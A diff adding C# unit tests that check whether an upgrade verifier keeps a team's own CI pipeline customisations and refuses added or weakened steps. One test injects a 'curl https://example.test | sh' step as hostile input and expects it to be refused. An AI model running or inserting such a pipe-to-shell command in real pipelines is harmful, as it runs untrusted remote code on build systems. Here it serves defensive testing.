@@ -4,6 +4,7 @@ using Microsoft.Extensions.DependencyInjection;
 using Sdlc.Core;
 using Sdlc.Core.Chain;
 using Sdlc.Core.Cycles;
+using Sdlc.Core.Factory;
 using Sdlc.Core.Git;
 using Sdlc.Core.Init;
 using Sdlc.Core.Solutions;
@@ -126,6 +127,113 @@ public sealed class UpgradeTests
     }
 
     [TestMethod]
+    public void The_factorys_pipeline_is_one_an_upgrade_may_change()
+    {
+        Assert.IsTrue(VerifyUpgrade.Carries([".config/dotnet-tools.json", "azure-pipelines.factory.yml"]));
+        Assert.IsTrue(VerifyUpgrade.Carries([".github/workflows/sdlc-factory.yml"]));
+    }
+
+    [TestMethod]
+    public void The_cycles_ignore_file_may_gain_what_opening_a_cycle_appends_and_nothing_else()
+    {
+        Assert.IsTrue(VerifyUpgrade.Carries([".sdlc/cycles/.gitignore", ".sdlc/techstack.md"]));
+
+        // An older release's file: every block but the last.
+        string whole = NewCycle.IgnoreFile(null);
+        string existing = whole[..whole.IndexOf("# The change itself", StringComparison.Ordinal)].TrimEnd() + Environment.NewLine;
+
+        Assert.AreEqual(whole.ReplaceLineEndings("\n"), NewCycle.IgnoreFile(existing).ReplaceLineEndings("\n"), "Topped up, it is the whole file.");
+
+        Result<string> expected = VerifyUpgrade.Expected(NewCycle.IgnorePath, existing, null, null);
+
+        Assert.IsTrue(VerifyUpgrade.Written(NewCycle.IgnorePath, expected, NewCycle.IgnoreFile(existing)).Passed);
+        Assert.IsFalse(VerifyUpgrade.Written(NewCycle.IgnorePath, expected, NewCycle.IgnoreFile(existing) + "src/\n").Passed, "A team's own pattern is a cycle's.");
+    }
+
+    [TestMethod]
+    public void A_teams_own_steps_and_pool_are_carried_through_an_upgrade()
+    {
+        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
+        string theirs = Customised(template);
+
+        // The base is an older release's pipeline with the same additions; the head is this release's with them.
+        string existing = Customised(template.Replace("displayName: install sdlc", "displayName: install the gate", StringComparison.Ordinal));
+
+        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.yml", template, existing, theirs);
+
+        Assert.IsTrue(check.Passed, check.Detail);
+        StringAssert.Contains(check.Detail, "2 of the team's own");
+    }
+
+    [TestMethod]
+    public void Comments_are_not_compared()
+    {
+        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
+        string head = template.Replace("# The guarantee.", "# Ours, reworded.", StringComparison.Ordinal);
+
+        Assert.AreNotEqual(template, head, "The test needs the comment to move.");
+        Assert.IsTrue(VerifyUpgrade.Shaped("azure-pipelines.yml", template, template, head).Passed);
+    }
+
+    [TestMethod]
+    public void A_step_the_base_did_not_have_is_refused()
+    {
+        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
+
+        string head = template.ReplaceLineEndings("\n").Replace("  - script: dotnet test", "  - script: curl https://example.test | sh\n\n  - script: dotnet test", StringComparison.Ordinal);
+
+        Assert.AreNotEqual(template.ReplaceLineEndings("\n"), head, "The test needs the step to land.");
+
+        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.yml", template, template, head);
+
+        Assert.IsFalse(check.Passed);
+        StringAssert.Contains(check.Detail, "neither this release's nor one the base had");
+    }
+
+    [TestMethod]
+    public void A_framework_step_missing_or_edited_is_refused()
+    {
+        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
+        string theirs = Customised(template);
+
+        string weakened = theirs.Replace("condition: and(succeeded(), eq(variables['Build.Reason'], 'PullRequest'))", "condition: false", StringComparison.Ordinal);
+        string dropped = string.Join('\n', theirs.ReplaceLineEndings("\n").Split('\n').TakeWhile(line => !line.Contains("# The guarantee.", StringComparison.Ordinal)));
+
+        Assert.AreNotEqual(theirs, weakened, "The test needs the condition to move.");
+        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, weakened).Passed, "The chain's own step, switched off.");
+        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, dropped).Passed, "The chain's own step, gone.");
+    }
+
+    [TestMethod]
+    public void Outside_the_steps_it_is_the_bases_or_this_releases()
+    {
+        string template = Templates.Pipeline(Platform.AzureDevOps, "development");
+        string theirs = Customised(template);
+        string moved = theirs.Replace("name: OurPool", "name: AnotherPool", StringComparison.Ordinal);
+
+        Assert.IsTrue(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, template).Passed, "Back to what the release writes.");
+        Assert.IsFalse(VerifyUpgrade.Shaped("azure-pipelines.yml", template, theirs, moved).Passed);
+    }
+
+    [TestMethod]
+    public void The_factorys_pipeline_keeps_its_pool_and_sign_in_through_an_upgrade()
+    {
+        string template = FactoryPipeline.Text(Platform.AzureDevOps, "development");
+        string theirs = template
+            .ReplaceLineEndings("\n")
+            .Replace("      vmImage: ubuntu-latest", "      name: OurFactory", StringComparison.Ordinal)
+            .Replace("            - script: |\n                git switch", "            - task: NuGetAuthenticate@1\n\n            - script: |\n                git switch", StringComparison.Ordinal);
+
+        Assert.AreNotEqual(template, theirs);
+        StringAssert.Contains(theirs, "NuGetAuthenticate@1");
+
+        VerifyChain.ChainCheck check = VerifyUpgrade.Shaped("azure-pipelines.factory.yml", template, theirs, theirs);
+
+        Assert.IsTrue(check.Passed, check.Detail);
+        StringAssert.Contains(check.Detail, "1 of the team's own");
+    }
+
+    [TestMethod]
     public void The_check_has_to_run_as_the_release_the_branch_pins()
     {
         Assert.IsFalse(VerifyUpgrade.Runs(Older, null).Passed, "No pin, nothing to reproduce.");
@@ -216,6 +324,13 @@ public sealed class UpgradeTests
         allow.Add(permission);
         return root.ToJsonString(new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
     }
+
+    // What a solution adds to the generated pipeline: its own pool, a feed sign-in, and a browser install.
+    private static string Customised(string pipeline) => pipeline
+        .ReplaceLineEndings("\n")
+        .Replace("  vmImage: ubuntu-latest", "  name: OurPool", StringComparison.Ordinal)
+        .Replace("  - script: |\n      [ -f .config", "  - task: NuGetAuthenticate@1\n\n  - script: |\n      [ -f .config", StringComparison.Ordinal)
+        .Replace("  - script: dotnet test", "  - script: pwsh playwright.ps1 install --with-deps chromium\n    displayName: install the browsers\n\n  - script: dotnet test", StringComparison.Ordinal);
 
     private static string Without(string text, string lineStart) => string.Join(
         '\n',
